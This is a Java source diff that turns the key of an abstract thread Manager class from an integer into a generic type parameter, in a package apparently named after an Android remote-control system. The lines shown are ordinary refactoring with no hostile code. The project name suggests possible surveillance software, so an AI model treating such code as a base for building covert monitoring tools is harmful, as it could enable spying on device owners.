@@ -23,9 +23,9 @@ import com.ht.RCSAndroidGUI.util.Check;
  *
  * @param <T> the generic type
  */
-public abstract class Manager<T extends ThreadBase> {
+public abstract class Manager<T extends ThreadBase, U> {
 	/** The running. */
-	protected  HashMap<Integer, T> running;
+	protected  HashMap<U, T> running;
 	
 	/** The threads. */
 	protected  HashMap<T, Thread> threads;
@@ -38,7 +38,7 @@ public abstract class Manager<T extends ThreadBase> {
 	 */
 	public Manager(){
 		status = Status.self();
-		running = new HashMap<Integer, T>();
+		running = new HashMap<U, T>();
 		threads = new HashMap<T, Thread>();
 	}
 	
@@ -59,14 +59,14 @@ public abstract class Manager<T extends ThreadBase> {
 	 *
 	 * @param key the key
 	 */
-	public abstract  void start(int key);
+	public abstract  void start(U key);
 	
 	/**
 	 * Stop.
 	 *
 	 * @param key the key
 	 */
-	public abstract  void stop(int key);
+	public abstract  void stop(U key);
 	
 	/**
 	 * Reload .
@@ -74,7 +74,7 @@ public abstract class Manager<T extends ThreadBase> {
 	 * @param key
 	 *            the key
 	 */
-	public final void reload(final int key) {
+	public final void reload(final U key) {
 		Check.requires(running!=null, "Null running");
 		final T a = running.get(key);
 		if(a!=null){
@@ -88,7 +88,7 @@ public abstract class Manager<T extends ThreadBase> {
 	 * @param key
 	 *            the key
 	 */
-	public final synchronized void restart(final int key) {
+	public final synchronized void restart(final U key) {
 		final T a = running.get(key);
 		stop(key);
 		start(key);
@@ -99,7 +99,7 @@ public abstract class Manager<T extends ThreadBase> {
 	 *
 	 * @return the running
 	 */
-	public HashMap<Integer, T> getRunning() {
+	public HashMap<U, T> getRunning() {
 		return running;
 	}
 }
